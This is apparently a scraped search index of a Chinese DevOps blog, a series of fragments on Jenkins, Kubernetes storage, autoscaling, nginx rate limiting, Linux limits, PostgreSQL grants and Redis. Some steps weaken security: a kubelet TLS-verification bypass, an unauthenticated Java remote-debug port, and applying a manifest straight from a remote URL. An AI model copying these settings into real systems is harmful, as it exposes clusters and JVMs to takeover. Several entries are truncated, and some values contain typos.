指令允许流水线根据给定的条件决定是否应该执行阶段。 when 指令必须包含至少一个条件。 如果when 指令包含多个条件, 所有的子条件必须返回True，阶段才能执行。 这与子条件在 allOf 条件下嵌套的情况相同。 branch: 当正在构建的分支与模式给定的分支匹配时，执行这个阶段,这只适用于多分支流水线例如: when { branch 'master' }   environment: 当指定的环境变量是给定的值时，执行这个步骤,例如: when { environment name: 'DEPLOY_TO', value: 'production' }   expression 当指定的Groovy表达式评估为true时，执行这个阶段, 例如: when { expression { return params.DEBUG_BUILD } }   not 当嵌套条件是错误时，执行这个阶段,必须包含一个条件，例如: when { not { branch 'master' } }   allOf 当所有的嵌套条件都为真时，执行这个阶段,必须包含至少一个条件，例如: when { allOf { branch 'master'; environment name: 'DEPLOY_TO', value: 'production' } }   anyOf 当至少有一个嵌套条件为真时，执行这个阶段,必须包含至少一个条件，例如: when { anyOf { branch 'master'; branch 'staging' } }   示例： // branch pipeline { agent any stages { stage('Example Build') { steps { echo 'Hello World' } } stage('Example Deploy') { when { branch 'production' } steps { echo 'Deploying' } } } } // env pipeline { agent any stages { stage('Example Build') { steps { echo 'Hello World' } } stage('Example Deploy') { when { branch 'production' environment name: 'DEPLOY_TO', value: 'production' } st","date":"2020-05-07 09:51","objectID":"/post/1606/:0:0","tags":["jenkins","devops"],"title":"pipeline语法","uri":"/post/1606/"},{"categories":["kubernetes"],"content":"1.安装nfs服务（略） ","date":"2020-04-24 18:51","objectID":"/post/1598/:1:0","tags":["k8s"],"title":"k8s使用基于nfs的storage class","uri":"/post/1598/"},{"categories":["kubernetes"],"content":"2.配置yaml文件 可以提前拉镜像：docker pull quay.io/external_storage/nfs-client-provisioner:latest deployment.yaml 需要修改你的nfs地址，和nfs共享目录 apiVersion: apps/v1 kind: Deployment metadata: name: nfs-client-provisioner labels: app: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default spec: replicas: 1 strategy: type: Recreate selector: matchLabels: app: nfs-client-provisioner template: metadata: labels: app: nfs-client-provisioner spec: serviceAccountName: nfs-client-provisioner containers: - name: nfs-client-provisioner image: quay.io/external_storage/nfs-client-provisioner:latest volumeMounts: - name: nfs-client-root mountPath: /persistentvolumes env: - name: PROVISIONER_NAME value: fuseim.pri/ifs - name: NFS_SERVER value: 10.0.0.100 - name: NFS_PATH value: /data/sc-test/ volumes: - name: nfs-client-root nfs: server: 10.0.0.100 path: /data/sc-test/\u003c/code\u003e\u003c/pre\u003e rbac.yaml apiVersion: v1 kind: ServiceAccount metadata: name: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default --- kind: ClusterRole apiVersion: rbac.authorization.k8s.io/v1 metadata: name: nfs-client-provisioner-runner rules: - apiGroups: [\"\"] resources: [\"persistentvolumes\"] verbs: [\"get\", \"list\", \"watch\", \"create\", \"delete\"] - apiGroups: [\"\"] resources: [\"persistentvolumeclaims\"] verbs: [\"get\", \"list\", \"watch\", \"update\"] - apiGroups: [\"storage.k8s.io\"] resources: [\"storageclasses\"] verbs: [\"get\", \"list\", \"watch\"] - apiGroups: [\"\"] resources: [\"events\"] verbs: [\"create\", \"update\", \"patch\"] --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: run-nfs-client-provisioner subjects: - kind: ServiceAccount name: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default roleRef: kind: ClusterRole name: nfs-client-provisioner-runner apiGroup: rbac.authorization.k8s.io --- kind: Role apiVersion: rbac.authorization.k8s.io/v1 metadata: name: leader-locking-nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default rules: - apiGroups: [\"\"] resources: [\"endpoints\"] verbs: [\"get\", \"list\", \"watch\", \"create\", \"update\", \"patch\"] --- kind: RoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: leader-locking-nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default subjects: - kind: ServiceAccount name: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default roleRef: kind: Role name: leader-locking-nfs-client-provisioner apiGroup: rbac.authorization.k8s.io\u003c/code\u003e\u003c/pre\u003e class.yaml apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: test-nfs-storage provisioner: fuseim.pri/ifs # fuseim.pri/ifs这个名称要和上面的delpoyment中PROVISIONER_NAME环境变量一致 parameters: archiveOnDelete: \"false\" # archiveOnDelete为false表示不存档，即删除数据，true表示存档，即重命名路径。格式为archieved-${namespace}-${pvcName}-${pvName} 创建资源上面所有的资源 ","date":"2020-04-24 18:51","objectID":"/post/1598/:2:0","tags":["k8s"],"title":"k8s使用基于nfs的storage class","uri":"/post/1598/"},{"categories":["kubernetes"],"content":"3.创建PVC kind: PersistentVolumeClaim apiVersion: v1 metadata: name: test-pvc annotations: volume.beta.kubernetes.io/storage-class: \"test-nfs-storage\" # 注解需要指定对应的storageclass spec: accessModes: - ReadWriteMany resources: requests: storage: 1Mi 现在可以通过kubectl get pvc查看pvc的状态了 NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE test-pvc Bound pvc-1bdc10af-860c-11ea-a9e0-000c29a221f1 1Mi RWX test-nfs-storage 42m pv的状态 NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE pvc-1bdc10af-860c-11ea-a9e0-000c29a221f1 1Mi RWX Delete Bound default/test-pvc test-nfs-storage 6m35s 当注解中指定storage-class时，pv会被自动创建,即上面的volume.beta.kubernetes.io/storage-class: \"test-nfs-storage\" 如果没有在pvc中写注解的话，可以在storage-class中修改配置，在metadata下添加如下内容。修改后默认会自动创建pv，但是这样灵活性就会变差 kubectl edit sc test-nfs-storage annotations: storageclass.kubernetes.io/is-default-class: \"true\" ** 测试一下没有注解的pvc，创建后可以发现依然会自动创建pv，我们上面修改的目的达到了** kind: PersistentVolumeClaim apiVersion: v1 metadata: name: test-pvc2 spec: accessModes: - ReadWriteMany resources: requests: storage: 1Mi NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE test-pvc Bound pvc-1bdc10af-860c-11ea-a9e0-000c29a221f1 1Mi RWX test-nfs-storage 73m test-pvc2 Bound pvc-c83e647a-8614-11ea-a9e0-000c29a221f1 1Mi RWX test-nfs-storage 11m pvc(pv)创建成功后会在nfs的共享目录（/data/sc-test）创建一个${namespace}-${pvcName}-${pvName}这样的目录 ","date":"2020-04-24 18:51","objectID":"/post/1598/:3:0","tags":["k8s"],"title":"k8s使用基于nfs的storage class","uri":"/post/1598/"},{"categories":["kubernetes"],"content":"4.配置测试pod kind: Pod apiVersion: v1 metadata: name: test-pod spec: containers: - name: test-pod image: busybox:1.24 command: - \"/bin/sh\" args: - \"-c\" - \"touch /mnt/SUCCESS \u0026amp;\u0026amp; exit 0 || exit 1\" volumeMounts: - name: nfs-pvc mountPath: \"/mnt\" restartPolicy: \"Never\" volumes: - name: nfs-pvc persistentVolumeClaim: claimName: test-pvc 当看到SUCCESS文件代表成功了 /data/sc-test/default-test-pvc-pvc-1bdc10af-860c-11ea-a9e0-000c29a221f1/SUCCESS ","date":"2020-04-24 18:51","objectID":"/post/1598/:4:0","tags":["k8s"],"title":"k8s使用基于nfs的storage class","uri":"/post/1598/"},{"categories":["kubernetes"],"content":"官方对单位的解释： https://v1-14.docs.kubernetes.io/zh/docs/tasks/configure-pod-container/assign-cpu-resource/#cpu-%E5%8D%95%E4%BD%8D requests：代表容器启动请求的资源限制，分配的资源必须要达到此要求 limits：代表最多可以请求多少资源 单位m：CPU的计量单位叫毫核(m)。一个节点的CPU核心数量乘以1000，得到的就是节点总的CPU总数量。如，一个节点有两个核，那么该节点的CPU总量为2000m。 下面拿双核举例： resources: requests: cpu: 50m #等同于0.05 memory: 512Mi limits: cpu: 100m #等同于0.1 memory: 1Gi 含义：该容器启动时请求50/2000的核心（2.5％）并且允许最多使用100/2000核心（5％）。 0.05个核除总核数量2就是2.5%了，0.1个核除总核数就2是5%了 resources: requests: cpu: 100m #等同于0.1 memory: 512Mi limits: cpu: 200m #等同于0.2 memory: 1Gi cpu单位m的含义：该容器启动时请求100/2000的核心（5％）并且允许最多使用200/2000核心（10％） 0.1个核除总核数量2就是5%了，0.2个核除总核数2就是10%了 可以看到下图是限制200m也就是0.2个核，最高可以跑到0.2 \u003cimg src=“images/04c1a06fa901de0693973a006dee995e.png “04c1a06fa901de0693973a006dee995e”” /\u003e ","date":"2020-04-22 16:24","objectID":"/post/1591/:0:0","tags":["k8s"],"title":"如何理解k8s中limit限制cpu单位","uri":"/post/1591/"},{"categories":["kubernetes"],"content":"1.部署ingress-nginx-controller kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/static/provider/baremetal/deploy.yaml 查看nodeport： ","date":"2020-04-21 19:07","objectID":"/post/1583/:0:0","tags":["k8s"],"title":"k8s中ingress-nginx的使用","uri":"/post/1583/"},{"categories":["基础内容","常用命令"],"content":"临时修改 命令： ulimit[-aHS][-c\u003ccore文件上限\u003e][-d\u003c数据节区大小\u003e][-f\u003c文件大小\u003e][-m\u003c内存大小\u003e][-n\u003c文件数目\u003e][-p\u003c缓冲区大小\u003e][-s\u003c堆叠大小\u003e][-t\u003cCPU时间\u003e][-u\u003c程序数目\u003e][-v\u003c虚拟内存大小\u003e] 参数： -a 显示目前资源限制的设定。 -c core文件上限 设定core文件的最大值，单位为区块。 -d 数据节区大小 程序数据节区的最大值，单位为KB。 -f 文件大小 shell所能建立的最大文件，单位为区块。 -H 设定资源的硬性限制，也就是管理员所设下的限制。严格的设定，必定不能超过这个设定的数值 -m 内存大小 指定可使用内存的上限，单位为KB。 -n 文件数目 指定同一时间最多可开启的文件数。 -p 缓冲区大小 指定管道缓冲区的大小，单位512字节。 -s 堆叠大小 指定堆叠的上限，单位为KB。 -S 设定资源的软限制。警告的设定，可以超过这个设定值，但是若超过则有警告信息 -t CPU时间 指定CPU使用时间的上限，单位为秒。 -u 程序数目 用户最多可开启的程序数目。 -v 虚拟内存大小 指定可使用的虚拟内存上限，单位为KB。 # 显示系统资源的设置 ulimit -a # 设置最大文件打开数 ulimit -n 10240 # 设置单一用户程序上限 ulimit -u 65535 ","date":"2020-04-13 15:30","objectID":"/post/1580/:1:0","tags":[],"title":"修改limit配置限制linux最大文件描述符和最大进程数","uri":"/post/1580/"},{"categories":["基础内容","常用命令"],"content":"永久修改-修改配置文件： vim /etc/security/limits.conf * soft noproc 65535 * hard noproc 65535 * soft nofile 65535 * hard nofile 65535 * soft memlock unlimited * hard memlock unlimited xx - nofile 65535 centos7还需要修改 vim /etc/security/limits.d/20-nproc.conf * soft nproc 4096 root soft nproc unlimited 说明： * 代表针对所有用户 soft 代表软限制：-S ：soft limit ，警告的设定，可以超过这个设定值，但是若超过则有警告信息 hard 代表硬限制：-H ：hard limit ，严格的设定，必定不能超过这个设定的数值 - 代表软硬同时设置 noproc 是代表最大进程数 nofile 是代表最大文件打开数 memlock 代表可以锁定其地址空间的内存量 unlimited 无限制 ","date":"2020-04-13 15:30","objectID":"/post/1580/:2:0","tags":[],"title":"修改limit配置限制linux最大文件描述符和最大进程数","uri":"/post/1580/"},{"categories":["kubernetes"],"content":"集群版本： \u003cimg src=“images/835fa4bac9d12acf6b01e5f19935ee64.png “835fa4bac9d12acf6b01e5f19935ee64\"” /\u003e 1.下载metrics-server 直接下载yaml文件： wget https://github.com/kubernetes-sigs/metrics-server/releases/download/v0.3.6/components.yaml 或者下载源代码进入到deploy目录 metrics-server-xxx/deploy/ 2.修改镜像地址 sed -i 's#k8s.gcr.io#registry.aliyuncs.com/google_containers#' components.yaml 3.安装 kubectl apply -f components.yaml 报错1： \u003cimg src=“images/aec1f6b47807d0999dc88714edbe5958.png “aec1f6b47807d0999dc88714edbe5958\"” /\u003e 默认通过dns解析主机名，解析失败，可以通过修改coredns配置解决 或者修改启动参数，手动指定ip类型 –kubelet-preferred-address-types=InternalIP \u003cimg src=“images/d44be1b3af01674abe8b5d6e070ba0d6.png “d44be1b3af01674abe8b5d6e070ba0d6\"” /\u003e 安装： kubectl apply -f components.yaml 报错2： \u003cimg src=“images/9e522a1bd48968663fe57e023b8a10ae.png “9e522a1bd48968663fe57e023b8a10ae”” /\u003e 证书问题，添加跳过认证的参数–kubelet-insecure-tls 4.验证 kubectl top ndoe \u003cimg src=“images/5914eedcda114db1e358dadc723ca526.png “5914eedcda114db1e358dadc723ca526\"” /\u003e 5.配置deplotment apiVersion: extensions/v1beta1 kind: Deployment metadata: name: hpa-test labels: app: hpa spec: template: metadata: labels: app: nginx spec: containers: - name: nginx-c image: nginx:1.14.2 ports: - containerPort: 80 resources: requests: cpu: 0.005 memory: 100Mi limits: cpu: 0.010 memory: 100MGi 6.创建hpa资源 kubectl autoscale --max=10 --min=1 --cpu-percent=5 deployment hpa-test \u003cimg src=“images/1cc8be7fce0adff30faa42a312bbeb4f.png “1cc8be7fce0adff30faa42a312bbeb4f”” /\u003e 7.压测 \u003cimg src=“images/42df87f29e2578f235f118f19305d1bb.png “42df87f29e2578f235f118f19305d1bb”” /\u003e 开始测试： while true;do curl -I 10.244.1.90;done 可以看到配置已经生效 \u003cimg src=“images/6af865c76f6ae20532363d68b679e9e6.png “6af865c76f6ae20532363d68b679e9e6\"” /\u003e \u003cimg src=“images/bfa09ec578ac8f185da2a782686928e4.png “bfa09ec578ac8f185da2a782686928e4\"” /\u003e ","date":"2020-04-08 12:03","objectID":"/post/1567/:0:0","tags":["k8s"],"title":"k8s使用metrics-server实现hpa弹性伸缩","uri":"/post/1567/"},{"categories":["系统服务"],"content":"三种实现方式： limit_conn_zone limit_req_zone ngx_http_upstream_module ","date":"2020-04-02 14:47","objectID":"/post/1546/:1:0","tags":["nginx"],"title":"nginx配置限流","uri":"/post/1546/"},{"categories":["系统服务"],"content":"安装压测工具 yum install -y httpd-tools # 10个连接发送1000个请求 ab -c 10 -n 1000 http://192.168.2.200/ ","date":"2020-04-02 14:47","objectID":"/post/1546/:2:0","tags":["nginx"],"title":"nginx配置限流","uri":"/post/1546/"},{"categories":["系统服务"],"content":"配置nginx限流 ","date":"2020-04-02 14:47","objectID":"/post/1546/:3:0","tags":["nginx"],"title":"nginx配置限流","uri":"/post/1546/"},{"categories":["系统服务"],"content":"第一种：limit_conn_zone限制连接数，特别是来自单个IP地址的连接数。 并非所有连接都会被计数。仅包含服务器正在处理的请求并且已读取整个请求头时，才对连接进行计数。 ** 在http字段中添加：** limit_conn_zone $binary_remote_addr zone=addr:10m; 含义： $binary_remote_addr: 使用这个标识来确认用户身份唯一性,$binary_remote_addr变量的大小对于IPv4地址始终为4字节，对于IPv6地址始终为16字节。存储状态在64位平台上总是占用64字节。一个1兆字节的区域可以保留大约1.6万个64字节状态。如果区域存储已用尽，服务器将把错误返回给所有请求。 zone: 指定一个共享内存区域名称为addr，大小为10m。当超过此限制时，服务器将返回错误 ** 在server字段添加：** limit_conn addr 1; 含义：每个ip只允许1个连接,使用的是addr共享区域 ** 测试：** ab -c 1 -n 10 http://192.168.2.200/一个连接发送10个请求 访问正常 \u003cimg src=“images/2b291f676588d1934a41ec97d0cf554a.png “2b291f676588d1934a41ec97d0cf554a”” /\u003e ab -c 2 -n 10 http://192.168.2.200/ 2个连接发送10个请求 其中有1个访问是失败的 \u003cimg src=“images/d959feb814b7156290fa6658cb20e8c2.png “d959feb814b7156290fa6658cb20e8c2\"” /\u003e ","date":"2020-04-02 14:47","objectID":"/post/1546/:3:1","tags":["nginx"],"title":"nginx配置限流","uri":"/post/1546/"},{"categories":["系统服务"],"content":"第二种：limit_req_zone，用于限制单一的IP地址的请求的处理速率。 在http字段中添加： limit_req_zone $binary_remote_addr zone=addr_req:10m rate=1r/s; 含义： $binary_remote_addr ：同上 zone: 指定一个共享内存区域名称，大小为10m。当超过此限制时，服务器将返回错误 rate: 代表每秒处理1个请求 在server字段添加： limit_req zone=addr_req burst=5; 含义： zone:使用的是addr_req共享区域 burst=5:代表超出频率的访问请求会放到缓冲区，最多放5个，超过这5个的请求会直接报503的错误。 测试： ab -c 10 -n 10 http://192.168.2.210/ 10个连接发送10个请求，我们限制的是每秒1个请求，第一个请求会被处理，后面的请求会放到缓冲区，超过5个会返回错误。所以会有6个请求是成功的。 \u003cimg src=“images/87894c16ffd030789e46af6185dd85e7.png “87894c16ffd030789e46af6185dd85e7\"” /\u003e \u003cimg src=“images/61259367a550ab13b98df3ccfa69ac1f.png “61259367a550ab13b98df3ccfa69ac1f”” /\u003e ","date":"2020-04-02 14:47","objectID":"/post/1546/:3:2","tags":["nginx"],"title":"nginx配置限流","uri":"/post/1546/"},{"categories":["系统服务"],"content":"第三种：ngx_http_upstream_module模块的max_conns(在nginx 1.11.5版本以后可用) 限制nginx到后端服务器的连接数，默认为0，无限制。 在upstream中每个主机后面配置 max_conns=2 测试： ab -c 3 -n 10 http://192.168.2.210/ \u003cimg src=“images/fee75e0c20dbec06b8662b2ec058367d.png “fee75e0c20dbec06b8662b2ec058367d”” /\u003e \u003cimg src=“images/2941c31d93f98bb9cd47bb9884ca4b2d.png “2941c31d93f98bb9cd47bb9884ca4b2d”” /\u003e ","date":"2020-04-02 14:47","objectID":"/post/1546/:3:3","tags":["nginx"],"title":"nginx配置限流","uri":"/post/1546/"},{"categories":["其他"],"content":"启动时加入参数： java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=30001 -jar xxx.jar 使用IDEA调试参考： https://blog.csdn.net/mimica247706624/article/details/80991656 ","date":"2020-03-16 17:09","objectID":"/post/1527/:0:0","tags":["java"],"title":"java程序开启远程debug","uri":"/post/1527/"},{"categories":["基础内容"],"content":" export PS1=\"\\[\\e[37m\\][\\[\\e[32m\\]\\u\\[\\e[37m\\]@MBP \\[\\e[36m\\]\\W\\[\\e[0m\\]]\\\\$ \" 说明： 字体颜色 字体背景颜色 30：黑 31：红 32：绿 33：黄 34：蓝色 35：紫色 36：深绿 37：白色 字体背景颜色 40：黑 41：深红 42：绿 43：黄色 44：蓝色 45：紫色 46：深绿 47：白色 显示方式 0：终端默认设置 1：高亮显示 4：下划线 5：闪烁 7：反白显示 8：隐藏 格式： \\033[1;31;40m # 1 是显示方式，可选。31 是字体颜色。40m 是字体背景颜色。\\033可以用\\e代替 \\033[0m # 恢复终端默认颜色，即取消颜色设置。 ","date":"2020-03-13 11:18","objectID":"/post/1523/:0:0","tags":[],"title":"shell颜色","uri":"/post/1523/"},{"categories":["kubernetes"],"content":"init容器初始化不成功，主容器不会执行 1.举例 创建pod apiVersion: v1 kind: Pod metadata: name: blog labels: app: blog spec: initContainers: - name: init-conf image: busybox command: - wget - -O - /work-dir/index.html - \"https://soulchild.cn\" volumeMounts: - name: work-dir mountPath: /work-dir/ containers: - name: blog image: nginx ports: - containerPort: 80 volumeMounts: - name: work-dir mountPath: /usr/share/nginx/html/ volumes: - name: work-dir emptyDir: {} 创建svc apiVersion: v1 kind: Service metadata: name: blog spec: selector: app: blog type: NodePort ports: - nodePort: 30002 port: 80 targetPort: 80 创建后可以访问master或node的IP+30002 ","date":"2020-03-10 16:17","objectID":"/post/1519/:0:0","tags":["k8s"],"title":"k8s之init容器","uri":"/post/1519/"},{"categories":["kubernetes"],"content":"简单记录 原文地址：https://www.kubernetes.org.cn/2362.html 官方中文文档：https://v1-14.docs.kubernetes.io/zh/docs/concepts/workloads/pods/pod-lifecycle/ 作用： liveness： Kubelet使用liveness probe（存活探针）来确定何时重启容器。例如，当应用程序处于运行状态但无法做进一步操作，liveness探针将捕获到deadlock，重启处于该状态下的容器，使应用程序在存在bug的情况下依然能够继续运行下去（谁的程序还没几个bug呢）。（是否重启取决于重启策略） readiness： Kubelet使用readiness probe（就绪探针）来确定容器是否已经就绪可以接受流量。只有当Pod中的容器都处于就绪状态时kubelet才会认定该Pod处于就绪状态。该信号的作用是控制哪些Pod应该作为service的后端。如果Pod处于非就绪状态，那么它们将会被从service的load balancer中移除。(不会改变容器运行状态，检测失败，pod的READ达不到预期的效果) readiness和liveness一般配合使用，liveness负责健康状态检查，重启容器。readiness负责将pod从svc中移除，控制流量。 多个liveness时，只会影响对应的container。 定义liveness exec： apiVersion: v1 kind: Pod metadata: name: liveness-exec labels: app: liveness spec: containers: - name: liveness image: busybox args: - /bin/sh - -c - touch /tmp/healthy; sleep 30; rm -f /tmp/healthy; sleep 600 livenessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 3 periodSeconds: 3 periodSeconds 规定kubelet要每隔3秒执行一次liveness probe。 initialDelaySeconds 告诉kubelet在第一次执行probe之前要的等待3秒钟。探针检测命令是在容器中执行 cat /tmp/healthy 命令。如果命令执行成功，将返回0，kubelet就会认为该容器是活着的并且很健康。如果返回非0值，kubelet就会杀掉这个容器并重启它。 http： apiVersion: v1 kind: Pod metadata: name: liveness-http labels: app: liveness-http spec: containers: - name: liveness-http image: cnych/liveness args: - /server livenessProbe: httpGet: port: 8080 path: /healthz initialDelaySeconds: 3 periodSeconds: 3 periodSeconds 指定kubelete需要每隔3秒执行一次liveness probe。 initialDelaySeconds 指定kubelet在该执行第一次探测之前需要等待3秒钟。该探针将向容器中的server的8080端口发送一个HTTP GET请求。如果server的/healthz路径的handler返回一个成功的返回码，kubelet就会认定该容器是活着的并且很健康。如果返回失败的返回码，kubelet将杀掉该容器并重启它。 任何大于200小于400的返回码都会认定是成功的返回码。其他返回码都会被认为是失败的返回码。 tcpSocket： 大同小异 定义readiness 有时，应用程序暂时无法对外部流量提供服务。 例如，应用程序可能需要在启动期间加载大量数据或配置文件。 在这种情况下，你不想杀死应用程序，但你也不想发送请求。 Kubernetes提供了readiness probe来检测和减轻这些情况。 Pod中的容器可以报告自己还没有准备，不能处理Kubernetes服务发送过来的流量。 readiness apiVersion: v1 kind: Pod metadata: name: readiness labels: app: readiness spec: containers: - name: readiness image: cnych/liveness args: - /server readinessProbe: httpGet: port: 8080 path: /healthz initialDelaySeconds: 3 periodSeconds: 3 ","date":"2020-03-10 12:17","objectID":"/post/1512/:0:0","tags":["k8s"],"title":"k8s之Pod的liveness和readiness探针","uri":"/post/1512/"},{"categories":["kubernetes"],"content":"1.postStart 这个钩子在创建容器之后立即执行。 但是，并不能保证钩子在容器本身的初始命令(ENTRYPOINT)之前运行。 主要用于资源部署、环境准备等。不过需要注意的是如果钩子花费时间过长以及于不能运行或者挂起，容器将不能达到Running状态。 yaml举例: apiVersion: v1 kind: Pod metadata: name: start-hook labels: app: test spec: containers: - name: start-hook image: nginx ports: - name: nginx-port containerPort: 80 lifecycle: postStart: exec: command: [\"/bin/bash\", \"-c\", \"echo before running \u0026gt; /postStart.txt\"] ","date":"2020-03-09 20:04","objectID":"/post/1507/:0:1","tags":["k8s"],"title":"k8s使用pod hook钩子函数","uri":"/post/1507/"},{"categories":["kubernetes"],"content":"2.PreStop 在容器终止之前立即调用此钩子。 它是阻塞的，所以只有此钩子执行完后，才会执行删除容器的操作 主要用于优雅关闭应用程序、通知其他系统等。如果钩子在执行期间挂起，Pod阶段将停留在Running状态并且不会达到failed状态 apiVersion: v1 kind: Pod metadata: name: stop-hook labels: app: test spec: containers: - name: stop-hook image: nginx ports: - name: nginx-port containerPort: 80 lifecycle: preStop: exec: command: [\"/usr/sbin/nginx\", \"-s\", \"quit\"] 优雅退出： 当pod被删除时，会处于Terminating状态，同时会将他从ep中摘除，kube-proxy更新ipvs规则摘除流量，也就是说这个pod就不会再有新的请求进来了。那么如果preStop使用了sleep 30，会等待30秒后真正删除pod，这30秒可以用来处理没有处理完的请求 ","date":"2020-03-09 20:04","objectID":"/post/1507/:0:2","tags":["k8s"],"title":"k8s使用pod hook钩子函数","uri":"/post/1507/"},{"categories":["kubernetes"],"content":"1.生成token kubeadm token create --print-join-command 2.加入集群 kubeadm join 192.168.0.10:6443 --token xxxxxxx --discovery-token-ca-cert-hash sha256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 其他命令 查看token列表 kubeadm token list 获取ca证书的sha256 hash值 openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2\u003e/dev/null | openssl dgst -sha256 -hex | sed 's/^.* //' ","date":"2020-03-09 14:57","objectID":"/post/1503/:0:0","tags":["k8s"],"title":"k8s增加node节点","uri":"/post/1503/"},{"categories":["其他"],"content":"打开配置文件 sudo vi /Library/Preferences/VMware\\ Fusion/vmnet8/nat.conf 找到如下配置 [incomingtcp] Use these with care - anyone can enter into your VM through these… The format and example are as follows: #\u003cexternal port number\u003e = \u003cVM’s IP address\u003e:\u003cVM’s port number\u003e 23 = 172.16.161.129:22 #将IP172.16.161.129虚拟机的22 端口映射到主机23端口 重启VM的网络服务 sudo /Applications/VMware\\ Fusion.app/Contents/Library/vmnet-cli –stop sudo /Applications/VMware\\ Fusion.app/Contents/Library/vmnet-cli –start ","date":"2020-03-09 12:12","objectID":"/post/1491/:0:0","tags":[],"title":"VMware Fusion 端口映射","uri":"/post/1491/"},{"categories":["系统服务","databases"],"content":"1.使用管理员连接pgsql # 赋予所有表的所有权限给指定用户 GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO \"用户名\"; # 赋予指定表的所有权限给指定用户 GRANT ALL PRIVILEGES ON \"表名\" TO \"用户名\"; #修改库的所有者 alter database 库名 owner to 用户名; #授予用户库权限 grant ALL ON DATABASE 库名 TO 用户名; #授予用户指定的库权限 grant select on all tables in schema public to 用户名; // 在那个db执行就授哪个db的权限 #修改表的所有者 alter table 表名 owner to 用户名; #授予用户表权限 GRANT ALL ON 表名 TO 用户名; #修改sequence所有者 alter sequence 序列名 owner to 用户名; #修改sequence权限 GRANT ALL ON 序列名 TO 用户名; # 只给指定的表只读权限 GRANT Usage ON SCHEMA \"schema1\" TO \"user1\"; GRANT Usage ON SCHEMA \"schema2\" TO \"user1\"; GRANT Select ON TABLE my_db.schema1.table1 TO \"user1\" GRANT Select ON TABLE my_db.schema2.table1 TO \"user1\" GRANT Select ON TABLE my_db.schema2.table2 TO \"user1\" ","date":"2020-03-05 12:12","objectID":"/post/1487/:0:0","tags":["pgsql"],"title":"Postgres设置用户角色权限","uri":"/post/1487/"},{"categories":["系统服务","databases"],"content":"进入redis后输入info # Server redis_mode:standalone # 运行模式(单点) os:Linux 3.10.0-862.el7.x86_64 x86_64 process_id:6054 # 当前 Redis 服务器进程id run_id:4b68cdf840e00e7980e4b76ad65b5f81ac2e7af7 tcp_port:6379 # 端口号 uptime_in_seconds:6641 # 运行多少秒 uptime_in_days:0 # 运行了多少天 # Clients connected_clients:2 # 客户端连接数量 # Memory used_memory:875648 # redis分配器分配的内存总量（单位byte） used_memory_human:855.12K # 同上，可读性高 used_memory_rss:14446592 # redis进程占用的内存（单位byte） used_memory_rss_human:13.78M # 同上，可读性高 used_memory_peak:875648 # used_memory使用的峰值 used_memory_peak_human:855.12K # 同上，可读性高 # Persistence loading:0 rdb_changes_since_last_save:0 # 上次rdb保存后，改变key的次数（新增和修改） rdb_bgsave_in_progress:0 # 当前是否在进行bgsave，是为1 rdb_last_save_time:1583302790 # 最后一次进行bgsave保存的时间戳 rdb_last_bgsave_status:ok # 最后一次进行bgsave保存的状态 rdb_last_bgsave_time_sec:0 # 最后一次进行bgsave保存的花费时间 aof_enabled:0 # 0代表未开启aof持久化 # Stats total_connections_received:23 # 运行以来连接过的客户端的总数量 total_commands_processed:68 # 运行以来执行过的命令的总数量 expired_keys:0 # 运行以来过期的key的数量 evicted_keys:0 # 由于 maxmemory 限制，而被回收内存的 key 的总数 keyspace_hits:11 # 查询key的命中次数 keyspace_misses:9 # 没命中的次数 pubsub_channels:0 # 发布/订阅频道数量 pubsub_patterns:0 # 发布/订阅模式数量 # Replication role:master # 当前实例的角色 connected_slaves:0 master_replid:e9a2198fa7f05ecdf0c2bb272815867887580ba6 master_replid2:0000000000000000000000000000000000000000 master_repl_offset:0 second_repl_offset:-1 repl_backlog_active:0 repl_backlog_size:1048576 repl_backlog_first_byte_offset:0 repl_backlog_histlen:0 # CPU used_cpu_sys:5.549805 used_cpu_user:5.548372 used_cpu_sys_children:0.053221 used_cpu_user_children:0.001071 # Cluster cluster_enabled:0 # Keyspace # 统计每个库中key的存活数量,过期数量，平均生存时间(单位毫秒) db0:keys=4,expires=0,avg_ttl=0 db1:keys=1,expires=1,avg_ttl=1205425200 ","date":"2020-03-04 16:24","objectID":"/post/1481/:0:0","tags":["redis"],"title":"redis中info参数含义","uri":"/post/1481/"},{"categories":["python"],"content":"1.安装django-redis-sessions模块 2.django中settings.py配置 SESSION_ENGINE = 'redis_sessions.session' SESSION_REDIS = { 'host': '10.0.0.200', 'port': 6379, 'db': 1, 'password': '', 'prefix': 'session', 'socket_timeout': 1 } 3.编写视图函数views.py def set_session(request): request.session['username'] = 'soulchild' return HttpResponse('设置session') def get_session(request): res = request.session.get('username') return HttpResponse(res) 4.配置路由urls.py url(r'^set_session$', views.set_session, name='set_session'), url(r'^get_session$', views.get_session, name='get_session'), 5.验证 启动django python manage.py runserver 打开：http://127.0.0.1:8000/set_session 查看redis \u003cimg src=“images/a2c4817f124bb306b99b289f8d73a2ba.png “a2c4817f124bb306b99b289f8d73a2ba”” /\u003e 打开：http://127.0.0.1:8000/get_session 结果正常显示 关于哨兵模式和集群可参考： https://pypi.org/project/django-redis-sessions/","date":"2020-03-04 14:26","objectID":"/post/1471/:0:0","tags":["redis","python"],"title":"django中使用redis存储session","uri":"/post/1471/"},{"categories":["python"],"content":"1.安装redis模块 2.代码 import redis if __name__ == '__main__': try: # 创建连接对象 sr = redis.Redis(host='10.0.0.200') # 设置一个kv值,(返回设置结果true，false) # res = sr.set('name', 'soulchild') # print(res) # 获取一个key对应的值 # res = sr.get('name') # print(res) # 删除key（删除成功几个就返回几） # print(sr.delete('a', 'b', 'c')) # 获取所有key # 